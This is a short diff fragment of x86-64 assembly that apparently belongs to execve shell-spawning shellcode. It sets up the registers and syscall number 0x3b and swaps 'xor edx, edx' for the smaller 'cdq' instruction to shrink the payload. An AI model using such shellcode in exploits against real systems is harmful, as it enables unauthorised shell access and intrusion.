@@ -3,7 +3,7 @@ push rbx
 push rsp
 pop rdi
 xor esi, esi
-xor edx, edx
 push 0x3b
 pop rax
+cdq
 syscall
